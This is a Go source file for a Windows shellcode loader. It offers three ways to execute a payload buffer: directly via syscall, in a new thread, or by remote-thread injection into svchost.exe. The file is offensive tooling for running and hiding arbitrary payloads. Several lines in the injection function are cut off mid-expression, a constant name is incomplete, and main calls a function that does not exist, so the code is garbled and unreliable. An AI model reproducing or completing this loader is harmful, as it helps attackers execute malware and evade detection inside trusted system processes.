package main 

import (
        "fmt"
        "syscall"
        "unsafe"
        "golang.org/x/sys/windows"
        "go-ps"
)

var buf = []byte {}

func FindProcess(proc string) int {
        processList, err := ps.Processes()
        if err != nil {
                return -1
        }
        for x := range processList {
                var process ps.Process
                process = processList[x]
                if process.Executable() != proc {
                        continue
                }
                p, errOpenProcess := windows.OpenProcess(windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
                if errOpenProcess != nil {
                        continue
                }
                windows.CloseHandle(p)
                return process.Pid()
        }
        return 0
}

func methodl_SysCall(sc []byte) {
        kernel32 := windows.NewLazySystemDLL("kernel32.dll")
        RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
        addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
        if err != nil {
                fmt.Printf("[!] VirutalAlloc : %s", err.Error())
        }
        RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
        var oldProtect uint32
        err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
        if err != nil {
                panic(fmt.Sprintf("[!] VirtualProtect : %s", err.Error()))
        }
        syscall.Syscall(addr, 0, 0, 0, 0)
}

func method2_CreateThread(sc []byte) {
        kernel32 := windows.NewLazyDLL("kernel32.dll")
        RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
        CreateThread := kernel32.NewProc("CreateThread")
        addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
        if err != nil {
                fmt.Printf("[!] VirutalAlloc : %s", err.Error())
        }
        RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
        var oldProtect uint32
        err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
        if err != nil {
                panic(fmt.Sprintf("[!] VirtualProtect : %s", err.Error()))
        }
        thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
        if err.Error() != "The operation completed successfully." {
                panic(fmt.Sprintf("[!] CreateThread : %s", err.Error()))
        }
        _, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}


func method3_injectProcess(sc []byte) {
        pid := FindProcess("svchost.exe")
        fmt.Printf("[*] Injecting into svchost.exe, PID=[%v]\n", pid)
        if pid == 0 {
                panic("Canot find svchost.exe")
        }
        kernel32 := windows.NewLazySystemDLL("kernel32.dll")
        VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
        VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
        WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
        CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

        proc, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
        if errOpenProcess != nil {
                panic(fmt.Sprintf("[!] OpenProcess Error : %s", errOpenProcess.Error()))
        }

        addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), 0, uintptr(len(sc)), windows
        if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully
                panic(fmt.Sprintf("[!] VirtualAlloc Error:\r\n%s", errVirtualAlloc.Error()))
        }

        _, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, (uintptr)(unsafe.
        if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed 
                panic(fmt.Sprintf("[!] WriteProcessMemory Error:\r\n%s", errWriteProcessMemory.Error(
        }
        op := 0
        _, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc), addr, uintptr(len(sc)), win
        if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed succ
                panic(fmt.Sprintf("[!] VirtualProtectEx Error:\r\n%s", errVirtualProtectEx.Error()))
        }
        _, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, addr, 0, 0, 0
        if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation comple
                panic(fmt.Sprintf("[!] CreateRemoteThreadEx Error:\r\n%s", errCreateRemoteThreadEx.Er
        }
        errCloseHandle := windows.CloseHandle(proc)
        if errCloseHandle != nil {
                panic(fmt.Sprintf("[!] CloseHandle Error:\r\n%s", errCloseHandle.Error()))
        }
}

func main() {
     // choose technique here
     SysCall(buf)
}
